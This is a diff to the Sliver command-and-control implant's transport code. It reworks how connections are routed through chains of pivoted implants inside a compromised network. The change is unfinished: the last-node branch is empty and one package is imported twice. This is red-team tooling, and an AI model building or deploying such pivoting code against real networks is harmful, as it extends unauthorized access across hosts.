@@ -29,6 +29,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
 	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
@@ -375,26 +376,47 @@ func (t *Transport) Stop(force bool) (err error) {
 	return
 }
 
-// HandleRouteStream - The transport is asked to route a stream given a route ID.
-// This function is called by Bon' routing handlers, once they have the routeID and the conn.
-func (t *Transport) HandleRouteStream(routeID uint32, src net.Conn) (err error) {
+// HandleRouteConn - The transport is asked to route a stream given a route parameter.
+// It determines the position of the implant in the route nodes, and depending on this,
+// it either pipes the connection  through another transport (a pivoted implant), or
+// it directly dials hosts on the implant's host subnet.
+func (t *Transport) HandleRouteConn(route *sliverpb.Route, src net.Conn) error {
+
 	// {{if .Config.Debug}}
-	log.Printf("[route] routing connection (ID: %d, Dest: %s)", routeID, src.RemoteAddr())
+	log.Printf("[route] routing connection (ID: %d, Dest: %s)", route.ID, src.RemoteAddr())
 	// {{end}}
 
-	var route bon.Route = bon.Route(routeID)
-	dst, err := t.Router.Connect(route)
-	if err != nil {
+	var routeID bon.Route = bon.Route(route.ID)
 
+	// If we are the last node in the chain, we directly dial other hosts
+	// on this implant's host subnet.
+	if len(route.Nodes) == 1 {
+
+	} else if len(route.Nodes) > 1 {
+		// Set up stream handle function: we find the transport connected
+		// to next node in chain, and give it the conn to be handled.
+		for _, t := range Transports.Active {
+			next := route.Nodes[1]
+			if t.URL.String() == next.Addr {
+
+				dst, err := t.Router.Connect(routeID)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[route] Error connecting to next node: %s", err.Error())
+					// {{end}}
+					return err
+				}
+
+				// {{if .Config.Debug}}
+				log.Printf("[mux] Outbound stream: muxing conn and piping")
+				// {{end}}
+
+				transport(src, dst) // Pipe connection
+			}
+		}
 	}
 
-	// {{if .Config.Debug}}
-	log.Printf("[mux] Outbound stream: muxing conn and piping")
-	// {{end}}
-
-	transport(src, dst) // Pipe connection
-
-	return
+	return nil
 }
 
 // In case we failed to use multiplexing infrastructure, we call here
